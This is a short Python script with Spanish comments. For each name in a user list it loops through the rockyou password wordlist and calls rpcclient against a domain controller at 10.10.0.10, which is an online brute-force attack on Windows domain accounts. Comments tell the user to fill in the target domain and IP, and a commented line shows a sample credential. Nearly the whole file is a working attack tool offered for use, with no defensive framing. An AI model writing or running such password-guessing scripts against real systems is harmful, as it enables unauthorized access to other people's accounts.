import subprocess
#subprocess.run(["ls", "-l"])
import requests
import pycurl
import ssl
from io import BytesIO

print ('Inicia proceso')    
filepath = 'users.txt'
with open(filepath) as fp:
   line = fp.readline()
   cnt = 1    
   while line:
       print(line.strip())
       val=''+line.strip()
       pas=''  
       filepath2 = '/usr/share/wordlists/rockyou.txt' 
       with open(filepath2) as fp2:
          line2 = fp2.readline()
          cnt2 = 1    
          while line2:
              pas=''+line2.strip()
              #get_body = subprocess.run(["ls", "-l" +pas])
              ##en la siguiente linea en dominio colocar el dominio al que vamos a realizar fuerza bruta
              lacadena="DOMINIO"+"\\"+val+"%"+pas
              #get_body = subprocess.run(["rpcclient","--user", "dominio\dsii.usr%admin1234","10.10.0.10"])
              #colocar la IP DOMINIO
              get_body = subprocess.run(["rpcclient","--user",lacadena,"10.10.0.10"])
              print (get_body)
              line2 = fp2.readline()
              cnt2 += 1
       line = fp.readline()
       cnt += 1
